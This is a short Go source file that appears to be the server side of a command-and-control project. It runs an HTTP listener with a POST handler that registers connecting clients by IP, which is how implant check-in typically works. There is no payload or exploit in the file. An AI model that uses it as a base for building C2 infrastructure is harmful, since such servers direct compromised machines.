package server

import (
	"bytes"
	"io"
	"net"
	"net/http"

	"github.com/execute-assembly/c2-proj/newserver/internal/bytehandler"
	"github.com/execute-assembly/c2-proj/newserver/internal/config"
	"github.com/execute-assembly/c2-proj/newserver/internal/database"
	"github.com/go-chi/chi/v5"
)

const (
	COMMAND_TYPE_REGISTER = 50
)

func StartServer() {

	r := chi.NewRouter()

	//r.Get(config.Cfg.GetEndpoint, GetHandler)
	r.Post(config.Cfg.PostEndpoint, PostHandler)

	r.Get("/", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("Hello Chi!"))
	})

	http.ListenAndServe(":8080", r)

}

func PostHandler(w http.ResponseWriter, r *http.Request) {

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed Reading POST Body", http.StatusInternalServerError)
		return
	}
	defer r.Body.Close()

	reader := bytes.NewReader(body)
	CommandType := bytehandler.Read4(reader)

	switch CommandType {
	case COMMAND_TYPE_REGISTER:
		Ip, _, _ := net.SplitHostPort(r.RemoteAddr)
		database.RegisterClient(reader, Ip)

	}

}
